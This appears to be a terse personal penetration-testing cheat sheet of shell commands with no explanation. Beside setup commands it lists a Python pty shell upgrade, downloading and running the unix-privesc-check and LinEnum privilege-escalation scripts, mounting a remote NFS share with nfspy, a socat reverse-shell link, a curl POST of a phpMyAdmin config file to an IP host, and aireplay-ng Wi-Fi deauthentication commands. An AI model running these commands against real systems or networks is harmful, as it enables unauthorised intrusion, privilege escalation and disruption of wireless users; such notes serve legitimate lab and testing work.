Screen Resolution

xrandr

xrandr -s HHHHxWWW


dpkg-reconfigure tzdata


apt-get install xdotool

apt-get install wicd-gtk


set ExitOnSession false


python -c 'import pty;pty.spawn("/bin/bash")'

stty -echo

dpkg --get-selections | grep deinstall


cd

curl -O http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz
tar xzfv unix-privesc-check-1.4.tar.gz
cd unix-privesc-check-1.4
chmod +x unix-privesc-check
./unix-privesc-check detailed > out.txt
grep WARNING out.txt

curl -O https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh



nfspy -o server=192.168.1.124:/home,hide,allow_other,ro,intr /mnt
fusermount -u /mnt


https://github.com/cornerpirate/socat-shell

Post with curl
curl -X POST -F "file=./phpmy/config.inc.php" http://192.168.118.196/test.php


airodump-ng -c 3 --bssid MAC -w ~/dir/ wlan0mon

aireplay-ng -0 25 -a MAC wlan0mon
